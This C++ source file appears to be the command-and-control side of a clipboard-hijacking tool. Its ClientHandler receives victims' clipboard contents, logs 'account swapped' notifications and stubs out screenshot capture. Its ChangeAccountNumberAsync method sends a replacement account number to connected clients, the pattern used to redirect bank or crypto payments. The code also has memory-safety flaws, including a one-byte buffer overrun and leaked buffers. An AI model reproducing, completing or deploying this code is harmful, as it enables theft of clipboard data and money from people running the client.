#include "ClientHandler.hh"
#include "Tools.hh"
#include "IpAddress.hh"
#include <future>
#include <chrono>
using namespace std::chrono_literals;

ClientHandler::ClientHandler(SOCKET clientSocket)
	: clientSocket(clientSocket)
{
	sockaddr sa{};
	int nLen = sizeof(sa);
	getpeername(this->clientSocket, &sa, &nLen);
	this->ipAddress = IpAddress{ sa };
}

ClientHandler::~ClientHandler()
{
}

std::string ClientHandler::RecvString(const Metadata& metadata) {
	char* buf = new char[metadata.length];
	int iResult = recv(this->clientSocket, buf, metadata.length, NULL);
	buf[iResult] = 0;
	return std::string(buf);
}

void ClientHandler::RecvClipboardString(const Metadata& metadata) {
	auto clipboardString = this->RecvString(metadata);
	Tools::PrintDebugMessage("Received clipboard message:\n" + clipboardString);
	clipboardContentHistory.push_back(clipboardString);
}

int ClientHandler::SendMetadata(Metadata metadata) {
	return this->Send((char*)&metadata, sizeof(metadata));
}


void ClientHandler::Handle() {
	while (true) {
		auto metadata = this->RecvMetadata();
		switch (metadata.dataType) {
		case DataType::STRING:
			this->RecvString(metadata);
			break;
		case DataType::INT32:
			//this->RecvInt32(metadata);
			break;
		case DataType::CLIPBOARD_STRING:
			this->RecvClipboardString(metadata);
			break;
		case DataType::ACCOUNT_SWAP_NOTIFICATION:
			Tools::PrintDebugMessage("Account swapped!");
			break;
		case DataType::SCREENSHOT:
			//this->RecvScreenshot(metadata);
			break;
		default:;
		}
	}
}

void ClientHandler::ChangeAccountNumberAsync(std::string accountNumber) {
	std::async(std::launch::async, [&]() {
		auto size = ::strlen(accountNumber.c_str());
		this->SendMetadata(Metadata{ DataType::CHANGE_ACCOUNT_NUMBER, size });
		this->Send(accountNumber.c_str(), size);
	});
}

Metadata ClientHandler::RecvMetadata()
{
	auto result = Metadata{};
	auto size = sizeof(result);
	int iResult = ::recv(this->clientSocket, (char*)&result, size, NULL);
	return result;
}

int ClientHandler::Send(const char* data, int size) {
	return ::send(this->clientSocket, data, size, NULL);
}
